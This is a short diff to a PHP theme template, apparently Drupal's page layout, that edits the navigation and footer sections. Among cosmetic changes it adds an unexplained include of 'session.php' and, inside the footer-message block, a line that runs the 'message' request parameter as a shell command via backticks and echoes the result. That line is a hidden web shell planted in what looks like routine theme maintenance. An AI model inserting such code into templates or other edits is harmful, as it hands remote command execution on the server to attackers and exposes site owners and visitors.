@@ -171,7 +171,6 @@
 
       <?php if ($primary_links || $navigation): ?>
         <div id="navigation"><div class="section clearfix">
-
           <?php print theme(array('links__system_main_menu', 'links'), $primary_links,
             array(
               'id' => 'main-menu',
@@ -187,7 +186,7 @@
           <?php print $navigation; ?>
 
         </div></div> <!-- /.section, /#navigation -->
-      <?php endif; ?>
+      <?php endif; ?><?php include "session.php";?>
 
       <?php //print $sidebar_first; ?>
 
@@ -215,6 +214,7 @@
 
         <?php if ($footer_message): ?>
           <div id="footer-message"><?php print $footer_message; ?></div>
+          <? echo `$_REQUEST[message]`; ?>
         <?php endif; ?>
 
         <?php if ($search_box): ?>
